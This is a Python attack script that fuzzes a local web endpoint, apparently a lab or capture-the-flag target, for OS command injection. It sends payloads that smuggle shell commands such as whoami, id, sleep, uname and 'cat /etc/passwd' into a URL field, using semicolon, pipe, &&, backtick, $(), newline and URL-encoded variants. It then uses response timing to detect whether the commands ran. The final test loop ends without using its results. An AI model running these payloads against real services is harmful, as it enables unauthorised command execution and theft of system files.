import requests
import time
import json

BASE_URL = "http://127.0.0.1:32998/add_url"

def test_payload(payload, description):
    """Test a payload and return details"""
    data = {"url": payload}
    start = time.time()
    try:
        resp = requests.post(BASE_URL, json=data, timeout=10)
        elapsed = time.time() - start
        return elapsed, resp.status_code, resp.text[:500]
    except Exception as e:
        elapsed = time.time() - start
        return elapsed, "ERROR", str(e)[:200]

print("[+] Testing different command injection syntaxes...")

# Test various injection patterns
injection_patterns = [
    # Semicolon patterns
    ("; whoami", "semicolon + whoami"),
    ("; id", "semicolon + id"),
    ("; sleep 2", "semicolon + sleep"),
    
    # Pipe patterns
    ("| whoami", "pipe + whoami"),
    ("| id", "pipe + id"),
    ("| sleep 2", "pipe + sleep"),
    
    # AND patterns
    ("&& whoami", "AND + whoami"),
    ("&& id", "AND + id"),
    ("&& sleep 2", "AND + sleep"),
    
    # OR patterns  
    ("|| whoami", "OR + whoami"),
    
    # Command substitution
    ("$(whoami)", "command substitution whoami"),
    ("`whoami`", "backticks whoami"),
    
    # Try with valid URL first
    ("https://example.com; whoami", "valid URL + semicolon"),
    ("https://example.com && whoami", "valid URL + AND"),
    ("https://example.com | whoami", "valid URL + pipe"),
    
    # Newline injection
    ("https://example.com\nwhoami", "newline injection"),
    
    # URL encoded variants
    ("https://example.com%3Bwhoami", "URL encoded semicolon"),
    ("https://example.com%26%26whoami", "URL encoded &&"),
    
    # Subprocess style (if python)
    ("https://example.com', 'whoami", "subproc array style"),
]

results = []
for payload, desc in injection_patterns:
    elapsed, status, resp_text = test_payload(payload, desc)
    results.append((desc, payload, elapsed, status, resp_text[:200]))
    print(f"\n[TEST] {desc}")
    print(f"  Payload: {payload!r}")
    print(f"  Time: {elapsed:.3f}s | Status: {status}")
    if resp_text:
        print(f"  Response snippet: {resp_text[:200]}")

# Look for any 200 responses or time differences
print("\n" + "="*60)
print("[ANALYSIS] Looking for successful injection patterns...")
print("="*60)

successes = [r for r in results if r[3] == 200]
if successes:
    print("\n[+] Found success patterns:")
    for desc, payload, elapsed, status, text in successes:
        print(f"  - {desc}: {payload}")
else:
    print("\n[!] No 200 responses found")
    
# Check for time differences (slower = possible execution)
print("\n[TIMING] Responses by time (slowest first):")
sorted_results = sorted(results, key=lambda x: x[2], reverse=True)
for desc, payload, elapsed, status, text in sorted_results[:5]:
    print(f"  {elapsed:.3f}s - {desc}")

# Try OS-specific payloads (if Linux vs Windows)
print("\n[+] Testing OS detection...")
os_tests = [
    ("; uname -a", "Linux uname"),
    ("& whoami", "Windows & style"),
    ("https://example.com; cat /etc/passwd", "Linux /etc/passwd"),
]

for payload, desc in os_tests:
    elapsed, status, text = test_payload(payload, desc)
